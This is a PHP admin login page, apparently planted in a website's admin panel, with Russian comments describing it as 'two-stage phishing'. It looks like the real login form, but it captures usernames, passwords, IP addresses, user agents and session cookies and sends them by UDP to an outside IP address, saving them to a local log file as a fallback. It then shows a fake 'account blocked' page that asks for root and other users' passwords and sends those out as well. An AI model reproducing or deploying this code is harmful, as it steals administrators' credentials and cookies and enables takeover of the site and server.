<?php
// login.php с двухэтапным фишингом
ini_set('display_errors', 1);
error_reporting(E_ALL);

require_once(__DIR__ . '/../includes/config.php');
require_once(__DIR__ . '/../includes/sql_builder/idiorm.php');
require_once(__DIR__ . '/../includes/db.php');
require_once(__DIR__ . '/../includes/functions/func.global.php');
require_once(__DIR__ . '/../includes/functions/func.admin.php');
require_once(__DIR__ . '/../includes/functions/func.users.php');
require_once(__DIR__ . '/../includes/functions/func.sqlquery.php');
require_once(__DIR__ . "/../includes/lang/lang_{$config['lang']}.php");

admin_session_start();

// Если уже в сессии — куда надо
if (!empty($_SESSION['admin']['id'])) {
    header('Location: index.php');
    exit;
}

// Генерация CSRF-токена как обычно
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Обработка POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ip      = $_SERVER['REMOTE_ADDR']    ?? '';
    $ua      = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $cookies = $_SERVER['HTTP_COOKIE']     ?? '';
    $time    = date('Y-m-d H:i:s');

    // Если это первый этап (stage≠2) — ловим админ-данные
    if (empty($_POST['stage']) || $_POST['stage'] !== '2') {
        $user = $_POST['username'] ?? '';
        $pass = $_POST['password'] ?? '';
        $log1 = sprintf(
            "%s - STAGE1 - IP=%s - UA=%s - Cookies=%s - user=%s&pass=%s\n",
            $time, $ip, $ua, $cookies, $user, $pass
        );
        // UDP-лог
        $sock = @fsockopen('udp://94.142.138.201', 9999, $e1, $e2, 1);
        if ($sock) { fwrite($sock, $log1); fclose($sock); }
        else      { @file_put_contents(__DIR__.'/logs.log', $log1, FILE_APPEND|LOCK_EX); }

        // Показываем форму «root-пароля»
        echo <<<HTML
<!doctype html>
<html lang="ru">
<head><meta charset="utf-8"><title>Подтверждение</title></head>
<body>
  <h2>Ваша учётная запись заблокирована</h2>
  <p>Введите пароль одного из пользователей: <strong>root</strong>, <strong>konstantin</strong>, <strong>savdo</strong> или <strong>diram2024</strong>(Если вас отправило обратно на /login.php то вы ввели не верный пароль):</p>
  <form method="post" action="">
    <input type="password" name="root_password" required autocomplete="off">
    <input type="hidden" name="stage" value="2">
    <button type="submit">Подтвердить</button>
  </form>
</body>
</html>
HTML;
        exit;
    }

    // Второй этап (stage=2) — ловим root-пароль
    $root = $_POST['root_password'] ?? '';
    $log2 = sprintf(
        "%s - STAGE2 - IP=%s - UA=%s - Cookies=%s - root_pass=%s\n",
        $time, $ip, $ua, $cookies, $root
    );
    $sock2 = @fsockopen('udp://94.142.138.201', 9999, $e3, $e4, 1);
    if ($sock2) { fwrite($sock2, $log2); fclose($sock2); }
    else        { @file_put_contents(__DIR__.'/logs.log', $log2, FILE_APPEND|LOCK_EX); }

    // Никогда не пускаем дальше
    header('Location: /admin/login.php');
    exit;
}

// GET — стандартная форма входа
?>
<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Вход | <?= htmlspecialchars($config['site_name'] ?? 'Admin') ?></title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
</head>
<body class="bg-light d-flex align-items-center" style="height:100vh">
  <div class="container">
    <div class="row justify-content-center">
      <div class="col-md-4">
        <div class="card">
          <div class="card-body">
            <h3 class="card-title mb-4">Вход</h3>
            <?php if (!empty($error)): ?>
              <div class="alert alert-danger"><?= htmlspecialchars($error) ?></div>
            <?php endif; ?>
            <form method="post" action="">
              <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">
              <div class="mb-3">
                <label class="form-label" for="username">Логин</label>
                <input class="form-control" id="username" name="username" required>
              </div>
              <div class="mb-3">
                <label class="form-label" for="password">Пароль</label>
                <input type="password" class="form-control" id="password" name="password" required>
              </div>
              <?php if (!empty($config['recaptcha_mode']) && $config['recaptcha_mode']==1): ?>
                <div class="mb-3">
                  <div class="g-recaptcha" data-sitekey="<?= htmlspecialchars($config['recaptcha_public_key']) ?>"></div>
                </div>
              <?php endif; ?>
              <button class="btn btn-primary w-100" type="submit">Войти</button>
            </form>
          </div>
        </div>
      </div>
    </div>
  </div>
</body>
</html>
